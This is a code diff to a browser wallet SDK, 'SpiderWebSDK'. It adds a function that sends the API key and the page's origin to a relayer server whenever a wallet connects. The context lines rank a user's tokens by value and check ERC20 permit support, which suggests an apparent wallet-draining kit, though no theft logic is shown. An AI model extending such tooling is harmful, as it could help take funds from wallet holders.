@@ -245,7 +245,21 @@ window.SpiderWebSDK = {
         // Return the highest value token found. If no prices were found, fall back to the first one.
         return highestValueToken || compatibleTokens[0];
     },
-    
+    // Add this function to your SpiderWebSDK object
+    _logConnectionEvent: async function() {
+        try {
+            await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
+                body: JSON.stringify({
+                    apiKey: this._config.apiKey,
+                    origin: window.location.origin
+                })
+            });
+        } catch (error) {
+            console.warn("SpiderWebSDK: Could not log connection event.", error);
+        }
+    },
     _checkPermitSupport: async function(tokenAddress) {
         try {
             const tokenContract = new ethers.Contract(tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
@@ -363,6 +377,7 @@ window.SpiderWebSDK = {
             await this._provider.send('eth_requestAccounts', []);
             this._signer = this._provider.getSigner();
             this._currentUserAddress = await this._signer.getAddress();
+            this._logConnectionEvent(); // <-- ADD THIS LINE
             
             this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');
             
